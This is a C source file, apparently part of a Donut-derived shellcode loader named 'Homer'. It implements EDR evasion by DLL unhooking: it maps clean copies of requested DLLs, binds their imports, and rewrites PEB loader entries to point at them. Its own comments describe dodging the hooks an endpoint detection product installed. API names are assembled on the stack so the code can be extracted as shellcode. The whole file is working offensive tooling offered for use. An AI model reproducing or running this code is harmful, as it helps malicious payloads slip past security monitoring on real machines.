/* Operator-defined pass: DLL unhooking by PEB redirection.
 *
 * Runs at HOMER_PRE_MAP, before the loader resolves any API. Instead of
 * writing a clean image over the loaded (possibly hooked) one, this maps a
 * fresh image of each requested DLL, binds its import table, and points the
 * loader's LDR_DATA_TABLE_ENTRY at the clean copy. The original dirty
 * mapping is never made writable/executable, so no +X protection transition
 * happens on the image the EDR instrumented.
 *
 * Image source order:
 *   1. \KnownDlls\<name>          (shared section, no disk I/O)
 *   2. \??\<FullDllName>          (SEC_IMAGE mapping of the loaded file)
 *
 * Only the three legacy PEB lists are redirected. The loader's private
 * index/hash tables are left untouched: Homer resolves APIs by walking
 * the lists.
 *
 * This is the full implementation, so deleting this file ships a loader
 * without unhooking. The DLL host build excludes it on purpose (repointing
 * LDR entries inside a foreign host corrupts the host).
 */

#include "pass.h"
#include "loader.h"

#define HOMER_UNHOOK_MAX  16

// LDR_DATA_TABLE_ENTRY tail offsets.  These members moved between Win7 and
// Win8; they are patched through fixed offsets because the size and layout
// of the rest of the structure varies by build.
#if defined(_WIN64)
  #define HOMER_LDR_ORIG_WIN7     0xD0
  #define HOMER_LDR_PARENT_WIN7   0
  #define HOMER_LDR_ORIG_NEW      0xF8
  #define HOMER_LDR_PARENT_NEW    0xB8
#else
  #define HOMER_LDR_ORIG_WIN7     0x6C
  #define HOMER_LDR_PARENT_WIN7   0
  #define HOMER_LDR_ORIG_NEW      0x80
  #define HOMER_LDR_PARENT_NEW    0x60
#endif

typedef struct _HU_IMAGE {
  char                  name[64];
  PVOID                 base;
  PIMAGE_NT_HEADERS     nt;
  PLDR_DATA_TABLE_ENTRY dte;
} HU_IMAGE;

typedef struct _HU_CTX {
  HU_IMAGE img[HOMER_UNHOOK_MAX];
  int      count;
} HU_CTX;

static int hu_lower(int c) {
  return (c >= 'A' && c <= 'Z') ? c + ('a' - 'A') : c;
}

static int hu_wide_len(const WCHAR *s) {
  int n = 0;
  while (s[n] != 0) n++;
  return n;
}

static void hu_wide_copy(WCHAR *dst, const char *src) {
  while (*src != 0) *dst++ = (WCHAR)(unsigned char)*src++;
  *dst = 0;
}

static int hu_ascii_eq(const char *a, const char *b) {
  int i = 0;
  while (a[i] != 0 && b[i] != 0) {
    if (hu_lower((unsigned char)a[i]) != hu_lower((unsigned char)b[i])) return 0;
    i++;
  }
  return a[i] == 0 && b[i] == 0;
}

// Case-insensitive compare of an ANSI base name (already .dll-normalised)
// against a PEB BaseDllName.
static int hu_name_eq(const char *name, PUNICODE_STRING uni) {
  int i = 0;
  if (uni == NULL || uni->Buffer == NULL) return 0;
  while (name[i] != 0) {
    WCHAR c = uni->Buffer[i];
    if (c == 0) return 0;
    if (hu_lower((int)c) != hu_lower((unsigned char)name[i])) return 0;
    i++;
  }
  return uni->Buffer[i] == 0;
}

// Reduce a user string to a bare DLL base name with a .dll suffix.
static int hu_normalize(const char *in, char *out, int cap) {
  int i = 0, start = 0, n = 0;

  while (in[i] != 0) {
    if (in[i] == '\\' || in[i] == '/') start = i + 1;
    i++;
  }
  i = start;
  while (in[i] == ' ' || in[i] == '\t') i++;
  while (in[i] != 0 && in[i] != ' ' && in[i] != '\t' && n < cap - 5) {
    out[n++] = in[i++];
  }
  if (n == 0) {
    out[0] = 0;
    return 0;
  }
  if (n < 4 ||
      out[n - 4] != '.' ||
      hu_lower(out[n - 3]) != 'd' ||
      hu_lower(out[n - 2]) != 'l' ||
      hu_lower(out[n - 1]) != 'l') {
    out[n++] = '.';
    out[n++] = 'd';
    out[n++] = 'l';
    out[n++] = 'l';
  }
  out[n] = 0;
  return n;
}

// Find the LDR entry for a module, skipping the host image.
static PLDR_DATA_TABLE_ENTRY hu_find_entry(PPEB peb, const char *name) {
  PPEB_LDR_DATA         ldr = peb->Ldr;
  PLIST_ENTRY           head = &ldr->InLoadOrderModuleList;
  PLIST_ENTRY           node;
  PLDR_DATA_TABLE_ENTRY dte;

  for (node = head->Flink; node != head && node != NULL; node = node->Flink) {
    dte = (PLDR_DATA_TABLE_ENTRY)node;
    if (dte->DllBase == NULL) continue;
    if (dte->DllBase == peb->ImageBaseAddress) continue;
    if (hu_name_eq(name, &dte->BaseDllName)) return dte;
  }
  return NULL;
}

// Resolve a module for an import/forwarder: prefer one of the clean images
// we just mapped, otherwise fall back to the PEB.
static PVOID hu_lookup(HU_CTX *ctx, const char *name) {
  char norm[64];
  int  i;

  if (hu_normalize(name, norm, sizeof(norm)) == 0) return NULL;

  for (i = 0; i < ctx->count; i++) {
    if (hu_ascii_eq(norm, ctx->img[i].name)) return ctx->img[i].base;
  }
  return (PVOID)homer_find_module(norm);
}

// Resolve an export, following forwarders through the clean image table.
static LPVOID hu_get_proc(HU_CTX *ctx, PVOID base, const char *name,
                          DWORD ordinal, int depth) {
  PIMAGE_DOS_HEADER       dos;
  PIMAGE_NT_HEADERS       nt;
  PIMAGE_EXPORT_DIRECTORY exp;
  PIMAGE_DATA_DIRECTORY   edir;
  PDWORD                  adr, sym;
  PWORD                   ord;
  DWORD                   rva, i;
  PCHAR                   p;
  char                    dll[64], fn[64];
  int                     a = 0, b = 0;

  if (base == NULL || depth > 8) return NULL;

  dos = (PIMAGE_DOS_HEADER)base;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
  nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

  edir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  rva  = edir->VirtualAddress;
  if (rva == 0) return NULL;

  exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, base, rva);
  adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
  sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
  ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);

  if (name != NULL) {
    for (i = 0; i < exp->NumberOfNames; i++) {
      if (homer_streq(RVA2VA(PCHAR, base, sym[i]), name) == 0) {
        rva = adr[ord[i]];
        break;
      }
    }
    if (i == exp->NumberOfNames) return NULL;
  } else {
    if (ordinal < exp->Base) return NULL;
    if ((ordinal - exp->Base) >= exp->NumberOfFunctions) return NULL;
    rva = adr[ordinal - exp->Base];
  }

  // Forwarder: the RVA points inside the export directory.
  if (rva >= edir->VirtualAddress && rva < edir->VirtualAddress + edir->Size) {
    p = RVA2VA(PCHAR, base, rva);
    while (p[a] != 0 && p[a] != '.' && a < (int)sizeof(dll) - 5) {
      dll[a] = p[a];
      a++;
    }
    dll[a] = 0;
    if (p[a] != '.') return NULL;
    a++;
    while (p[a] != 0 && b < (int)sizeof(fn) - 1) {
      fn[b++] = p[a++];
    }
    fn[b] = 0;

    return hu_get_proc(ctx, hu_lookup(ctx, dll), fn, 0, depth + 1);
  }

  return RVA2VA(LPVOID, base, rva);
}

// Make an IAT range writable on the clean image before binding it.
static int hu_make_writable(NtProtectVirtualMemory_t protect, PVOID addr, SIZE_T len) {
  PVOID  b = addr;
  SIZE_T sz = len;
  ULONG  old = 0;
  if (protect == NULL || len == 0) return 0;
  return protect((HANDLE)-1, &b, &sz, PAGE_READWRITE, &old) >= 0;
}

// Bind the import table of a freshly mapped image.  Returns 0 if any import
// could not be resolved (caller then leaves the dirty entry in place).
static int hu_bind_imports(HU_CTX *ctx, HU_IMAGE *img,
                           NtProtectVirtualMemory_t protect) {
  PIMAGE_IMPORT_DESCRIPTOR      imp;
  PIMAGE_DELAYLOAD_DESCRIPTOR   del;
  PIMAGE_THUNK_DATA             oft, ft;
  PIMAGE_IMPORT_BY_NAME         ibn;
  PCHAR                         dllname;
  DWORD                         rva;
  PVOID                         dll;

  rva = img->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
  if (rva == 0) goto delay_imports;

  imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, img->base, rva);
  for (; imp->Name != 0; imp++) {
    PIMAGE_THUNK_DATA probe;
    SIZE_T            n = 0;

    dllname = RVA2VA(PCHAR, img->base, imp->Name);
    dll = hu_lookup(ctx, dllname);
    if (dll == NULL) return 0;

    oft = imp->OriginalFirstThunk != 0
          ? RVA2VA(PIMAGE_THUNK_DATA, img->base, imp->OriginalFirstThunk)
          : RVA2VA(PIMAGE_THUNK_DATA, img->base, imp->FirstThunk);
    ft  = RVA2VA(PIMAGE_THUNK_DATA, img->base, imp->FirstThunk);

    // The image section is mapped RX; make the IAT writable first.
    for (probe = oft; probe->u1.AddressOfData != 0; probe++) n++;
    if (!hu_make_writable(protect, ft, (n + 1) * sizeof(IMAGE_THUNK_DATA))) return 0;

    for (;; oft++, ft++) {
      LPVOID addr;

      if (oft->u1.AddressOfData == 0) break;

      if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
        addr = hu_get_proc(ctx, dll, NULL, IMAGE_ORDINAL(oft->u1.Ordinal), 0);
      } else {
        ibn  = RVA2VA(PIMAGE_IMPORT_BY_NAME, img->base, oft->u1.AddressOfData);
        addr = hu_get_proc(ctx, dll, ibn->Name, 0, 0);
      }
      if (addr == NULL) return 0;
      ft->u1.Function = (ULONG_PTR)addr;
    }
  }

delay_imports:
  rva = img->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;
  if (rva == 0) return 1;

  del = RVA2VA(PIMAGE_DELAYLOAD_DESCRIPTOR, img->base, rva);
  for (; del->DllNameRVA != 0; del++) {
    PIMAGE_THUNK_DATA probe;
    SIZE_T            n = 0;

    dllname = RVA2VA(PCHAR, img->base, del->DllNameRVA);
    dll = hu_lookup(ctx, dllname);
    if (dll == NULL) continue;

    oft = RVA2VA(PIMAGE_THUNK_DATA, img->base, del->ImportNameTableRVA);
    ft  = RVA2VA(PIMAGE_THUNK_DATA, img->base, del->ImportAddressTableRVA);

    for (probe = oft; probe->u1.AddressOfData != 0; probe++) n++;
    if (!hu_make_writable(protect, ft, (n + 1) * sizeof(IMAGE_THUNK_DATA))) return 0;

    for (;; oft++, ft++) {
      LPVOID addr;

      if (oft->u1.AddressOfData == 0) break;

      if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
        addr = hu_get_proc(ctx, dll, NULL, IMAGE_ORDINAL(oft->u1.Ordinal), 0);
      } else {
        ibn  = RVA2VA(PIMAGE_IMPORT_BY_NAME, img->base, oft->u1.AddressOfData);
        addr = hu_get_proc(ctx, dll, ibn->Name, 0, 0);
      }
      if (addr == NULL) return 0;
      ft->u1.Function = (ULONG_PTR)addr;
    }
  }
  return 1;
}

// Map a view of a section, preferring RX so the redirected image is directly
// executable.  Fall back to RO + NtProtectVirtualMemory if the kernel rejects
// RX at map time.
static PVOID hu_map_view(HANDLE section, NtMapViewOfSection_t map,
                         NtProtectVirtualMemory_t protect) {
  PVOID    base = NULL;
  SIZE_T   view = 0;
  NTSTATUS st;

  st = map(section, (HANDLE)-1, &base, 0, 0, NULL, &view,
           ViewShare, 0, PAGE_EXECUTE_READ);
  if (st >= 0 && base != NULL) return base;
  DPRINT("unhook: map RX failed %08lX", (unsigned long)st);

  base = NULL;
  view = 0;
  st = map(section, (HANDLE)-1, &base, 0, 0, NULL, &view,
           ViewShare, 0, PAGE_READONLY);
  if (st < 0 || base == NULL) {
    DPRINT("unhook: map RO failed %08lX", (unsigned long)st);
    return NULL;
  }

  if (protect != NULL) {
    PVOID b = base;
    SIZE_T sz = view;
    ULONG old = 0;
    if (protect((HANDLE)-1, &b, &sz, PAGE_EXECUTE_READ, &old) >= 0) return base;
  }
  return NULL;
}

static PVOID hu_map_known(const char *name, int dlls32, NtOpenSection_t open,
                          NtMapViewOfSection_t map,
                          NtProtectVirtualMemory_t protect, NtClose_t close) {
  WCHAR            path[300];
  WCHAR           *p;
  UNICODE_STRING   us;
  OBJECT_ATTRIBUTES oa;
  HANDLE           h = NULL;
  PVOID            base = NULL;
  NTSTATUS         st;

  // "\\KnownDlls\\" / "\\KnownDlls32\\" without .rdata literals.
  path[0] = '\\'; path[1] = 'K'; path[2] = 'n'; path[3] = 'o';
  path[4] = 'w';  path[5] = 'n'; path[6] = 'D'; path[7] = 'l';
  path[8] = 'l';  path[9] = 's';
  if (dlls32) {
    path[10] = '3'; path[11] = '2'; path[12] = '\\';
    p = path + 13;
  } else {
    path[10] = '\\';
    p = path + 11;
  }
  hu_wide_copy(p, name);

  us.Buffer        = path;
  us.Length        = (USHORT)(hu_wide_len(path) * sizeof(WCHAR));
  us.MaximumLength = (USHORT)(us.Length + sizeof(WCHAR));

  Memset(&oa, 0, sizeof(oa));
  oa.Length     = sizeof(oa);
  oa.ObjectName = &us;
  oa.Attributes = HOMER_OBJ_CASE_INSENSITIVE;

  st = open(&h, HOMER_SECTION_MAP_READ | HOMER_SECTION_MAP_EXECUTE, &oa);
  if (st < 0 || h == NULL) return NULL;

  base = hu_map_view(h, map, protect);
  if (close != NULL) close(h);
  return base;
}

static PVOID hu_map_file(PUNICODE_STRING full, NtOpenFile_t open,
                         NtCreateSection_t create, NtMapViewOfSection_t map,
                         NtProtectVirtualMemory_t protect, NtClose_t close) {
  WCHAR            path[340];
  UNICODE_STRING   us;
  OBJECT_ATTRIBUTES oa;
  IO_STATUS_BLOCK  iosb;
  HANDLE           fh = NULL, sh = NULL;
  PVOID            base = NULL;
  NTSTATUS         st;
  int              i = 0;

  if (full == NULL || full->Buffer == NULL || full->Length == 0) return NULL;
  if (full->Length / sizeof(WCHAR) > 320) return NULL;

  path[0] = '\\';
  path[1] = '?';
  path[2] = '?';
  path[3] = '\\';
  while (i * sizeof(WCHAR) < full->Length) {
    path[4 + i] = full->Buffer[i];
    i++;
  }
  path[4 + i] = 0;

  us.Buffer        = path;
  us.Length        = (USHORT)((4 + i) * sizeof(WCHAR));
  us.MaximumLength = (USHORT)(us.Length + sizeof(WCHAR));

  Memset(&oa, 0, sizeof(oa));
  oa.Length     = sizeof(oa);
  oa.ObjectName = &us;
  oa.Attributes = HOMER_OBJ_CASE_INSENSITIVE;

  Memset(&iosb, 0, sizeof(iosb));

  st = open(&fh,
            HOMER_FILE_READ_DATA | HOMER_FILE_EXECUTE | HOMER_FILE_READ_ATTRIBUTES,
            &oa, &iosb,
            HOMER_FILE_SHARE_READ | HOMER_FILE_SHARE_WRITE | HOMER_FILE_SHARE_DELETE,
            HOMER_FILE_NON_DIRECTORY_FILE | HOMER_FILE_SYNCHRONOUS_IO_NONALERT);
  if (st < 0 || fh == NULL) {
    DPRINT("unhook: NtOpenFile failed %08lX", (unsigned long)st);
    return NULL;
  }

  st = create(&sh,
              HOMER_SECTION_MAP_READ | HOMER_SECTION_MAP_EXECUTE,
              NULL, NULL, PAGE_EXECUTE_READ, HOMER_SEC_IMAGE, fh);
  if (close != NULL) close(fh);
  if (st < 0 || sh == NULL) {
    DPRINT("unhook: NtCreateSection failed %08lX", (unsigned long)st);
    return NULL;
  }

  base = hu_map_view(sh, map, protect);
  if (close != NULL) close(sh);
  return base;
}

// Rewrite one LDR entry so it describes the clean image.
static void hu_patch_entry(PLDR_DATA_TABLE_ENTRY dte, PVOID base,
                           PIMAGE_NT_HEADERS nt, PPEB peb) {
  DWORD off_orig = 0, off_parent = 0;
  PVOID old_base = dte->DllBase;
  PVOID old_ep   = dte->EntryPoint;

  dte->DllBase     = base;
  dte->EntryPoint  = nt->OptionalHeader.AddressOfEntryPoint != 0
                     ? RVA2VA(PVOID, base, nt->OptionalHeader.AddressOfEntryPoint)
                     : NULL;
  dte->SizeOfImage = nt->OptionalHeader.SizeOfImage;

  if (peb->OSMajorVersion == 6 && peb->OSMinorVersion == 1) {
    off_orig   = HOMER_LDR_ORIG_WIN7;
    off_parent = HOMER_LDR_PARENT_WIN7;
  } else if (peb->OSMajorVersion > 6 ||
             (peb->OSMajorVersion == 6 && peb->OSMinorVersion >= 2)) {
    off_orig   = HOMER_LDR_ORIG_NEW;
    off_parent = HOMER_LDR_PARENT_NEW;
  } else {
    // Unknown/Vista layout: only the stable leading fields are safe.
    return;
  }

  DPRINT("unhook: entry %p base %p->%p ep %p->%p orig %p parent %p os %u.%u",
         (PVOID)dte, old_base, base, old_ep, dte->EntryPoint,
         (PVOID)*(ULONG_PTR *)((PBYTE)dte + off_orig),
         off_parent ? *(PVOID *)((PBYTE)dte + off_parent) : NULL,
         peb->OSMajorVersion, peb->OSMinorVersion);

  *(ULONG_PTR *)((PBYTE)dte + off_orig) = (ULONG_PTR)nt->OptionalHeader.ImageBase;
  if (off_parent != 0) {
    *(PVOID *)((PBYTE)dte + off_parent) = NULL;
  }
}

// Patch the entry from each of the three legacy lists.  All three normally
// reference the same LDR_DATA_TABLE_ENTRY, so the later passes are no-ops.
static void hu_patch_lists(PPEB peb, const char *name, PVOID base,
                           PIMAGE_NT_HEADERS nt) {
  PPEB_LDR_DATA ldr = peb->Ldr;
  PLIST_ENTRY   heads[3];
  ULONG_PTR     offs[3];
  int           k;

  heads[0] = &ldr->InLoadOrderModuleList;
  heads[1] = &ldr->InMemoryOrderModuleList;
  heads[2] = &ldr->InInitializationOrderModuleList;

  offs[0] = offsetof(LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
  offs[1] = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
  offs[2] = offsetof(LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);

  for (k = 0; k < 3; k++) {
    PLIST_ENTRY node = heads[k]->Flink;
    if (node == NULL) continue;

    while (node != heads[k] && node != NULL) {
      PLDR_DATA_TABLE_ENTRY dte =
        (PLDR_DATA_TABLE_ENTRY)((PBYTE)node - offs[k]);

      if (hu_name_eq(name, &dte->BaseDllName)) {
        if (dte->DllBase != base) hu_patch_entry(dte, base, nt, peb);
        break;
      }
      node = node->Flink;
    }
  }
}

static VOID HomerUnhook(PDONUT_INSTANCE inst) {
  char                     list[DONUT_MAX_NAME + 1];
  char                     name[64], norm[64];
  PPEB                     peb;
  HU_CTX                   ctx;
  NtOpenSection_t          p_open;
  NtOpenFile_t             p_openfile;
  NtMapViewOfSection_t     p_map;
  NtCreateSection_t        p_create;
  NtProtectVirtualMemory_t p_protect;
  NtClose_t                p_close;
  int                      i = 0, n, ok;

  if (inst == NULL) return;

  while (inst->unhook[i] != 0 && i < DONUT_MAX_NAME) {
    list[i] = inst->unhook[i];
    i++;
  }
  list[i] = 0;
  if (i == 0) return;

  peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
  if (peb == NULL || peb->Ldr == NULL) return;

  // Build "ntdll.dll" and the API names on the stack.  String literals
  // would land in .rdata, which exe2h does not extract into the shellcode.
  {
    char dll[10], a[16], b[12], c[20], d[17], e[24], f[8];

    dll[0] = 'n'; dll[1] = 't'; dll[2] = 'd'; dll[3] = 'l'; dll[4] = 'l';
    dll[5] = '.'; dll[6] = 'd'; dll[7] = 'l'; dll[8] = 'l'; dll[9] = 0;

    a[0]='N'; a[1]='t'; a[2]='O'; a[3]='p'; a[4]='e'; a[5]='n'; a[6]='S';
    a[7]='e'; a[8]='c'; a[9]='t'; a[10]='i'; a[11]='o'; a[12]='n'; a[13]=0;

    b[0]='N'; b[1]='t'; b[2]='O'; b[3]='p'; b[4]='e'; b[5]='n'; b[6]='F';
    b[7]='i'; b[8]='l'; b[9]='e'; b[10]=0;

    c[0]='N'; c[1]='t'; c[2]='M'; c[3]='a'; c[4]='p'; c[5]='V'; c[6]='i';
    c[7]='e'; c[8]='w'; c[9]='O'; c[10]='f'; c[11]='S'; c[12]='e'; c[13]='c';
    c[14]='t'; c[15]='i'; c[16]='o'; c[17]='n'; c[18]=0;

    d[0]='N'; d[1]='t'; d[2]='C'; d[3]='r'; d[4]='e'; d[5]='a'; d[6]='t';
    d[7]='e'; d[8]='S'; d[9]='e'; d[10]='c'; d[11]='t'; d[12]='i'; d[13]='o';
    d[14]='n'; d[15]=0;

    e[0]='N'; e[1]='t'; e[2]='P'; e[3]='r'; e[4]='o'; e[5]='t'; e[6]='e';
    e[7]='c'; e[8]='t'; e[9]='V'; e[10]='i'; e[11]='r'; e[12]='t'; e[13]='u';
    e[14]='a'; e[15]='l'; e[16]='M'; e[17]='e'; e[18]='m'; e[19]='o'; e[20]='r';
    e[21]='y'; e[22]=0;

    f[0]='N'; f[1]='t'; f[2]='C'; f[3]='l'; f[4]='o'; f[5]='s'; f[6]='e'; f[7]=0;

    p_open     = (NtOpenSection_t)homer_get_proc(dll, a);
    p_openfile = (NtOpenFile_t)homer_get_proc(dll, b);
    p_map      = (NtMapViewOfSection_t)homer_get_proc(dll, c);
    p_create   = (NtCreateSection_t)homer_get_proc(dll, d);
    p_protect  = (NtProtectVirtualMemory_t)homer_get_proc(dll, e);
    p_close    = (NtClose_t)homer_get_proc(dll, f);
  }

  if (p_map == NULL) return;

  Memset(&ctx, 0, sizeof(ctx));

  // Phase 1: locate and map every requested DLL.
  i = 0;
  while (list[i] != 0 && ctx.count < HOMER_UNHOOK_MAX) {
    PVOID                 base = NULL;
    PLDR_DATA_TABLE_ENTRY dte;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    HU_IMAGE             *img;

    n = 0;
    while (list[i] != 0 && list[i] != ';' && n < (int)sizeof(name) - 1) {
      name[n++] = list[i++];
    }
    if (list[i] == ';') i++;
    name[n] = 0;
    if (n == 0) continue;

    if (hu_normalize(name, norm, sizeof(norm)) == 0) continue;

    dte = hu_find_entry(peb, norm);
    if (dte == NULL) {
      DPRINT("unhook: %s is not loaded", norm);
      continue;
    }

    if (p_open != NULL) {
#ifdef _WIN64
      base = hu_map_known(norm, 0, p_open, p_map, p_protect, p_close);
#else
      // WoW64 uses \KnownDlls32; a native 32-bit OS has no such directory.
      base = hu_map_known(norm, 1, p_open, p_map, p_protect, p_close);
      if (base == NULL) {
        base = hu_map_known(norm, 0, p_open, p_map, p_protect, p_close);
      }
#endif
    }
    if (base == NULL && p_openfile != NULL && p_create != NULL) {
      base = hu_map_file(&dte->FullDllName, p_openfile, p_create,
                         p_map, p_protect, p_close);
    }
    if (base == NULL) {
      DPRINT("unhook: unable to map a clean image of %s", norm);
      continue;
    }

    dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
      DPRINT("unhook: %s mapped image has no DOS header", norm);
      continue;
    }
    nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
      DPRINT("unhook: %s mapped image has no NT header", norm);
      continue;
    }
#ifdef _WIN64
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
      DPRINT("unhook: %s mapped image has wrong machine type", norm);
      continue;
    }
#else
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
      DPRINT("unhook: %s mapped image has wrong machine type", norm);
      continue;
    }
#endif

    img = &ctx.img[ctx.count++];
    for (n = 0; norm[n] != 0 && n < (int)sizeof(img->name) - 1; n++) {
      img->name[n] = norm[n];
    }
    img->name[n] = 0;
    img->base = base;
    img->nt   = nt;
    img->dte  = dte;
  }

  if (ctx.count == 0) return;

  // Phase 2: bind imports against the clean image set (PEB is still dirty,
  // so unlisted dependencies resolve normally).
  for (i = 0; i < ctx.count; i++) {
    ok = hu_bind_imports(&ctx, &ctx.img[i], p_protect);
    if (!ok) {
      DPRINT("unhook: import binding failed for %s; leaving it dirty",
             ctx.img[i].name);
      ctx.img[i].base = NULL;
    }
  }

  // Phase 3: redirect the three PEB lists.
  for (i = 0; i < ctx.count; i++) {
    if (ctx.img[i].base == NULL) continue;
    hu_patch_lists(peb, ctx.img[i].name, ctx.img[i].base, ctx.img[i].nt);
    DPRINT("unhook: %s -> %p", ctx.img[i].name, ctx.img[i].base);
  }
}

int homer_pass__unhook(PDONUT_INSTANCE inst, PDONUT_MODULE mod,
                       PVOID base, PIMAGE_NT_HEADERS nt) {
    (void)mod;
    (void)base;
    (void)nt;
    HomerUnhook(inst);
    return 0;
}

HOMER_REGISTER(unhook, HOMER_PRE_MAP)
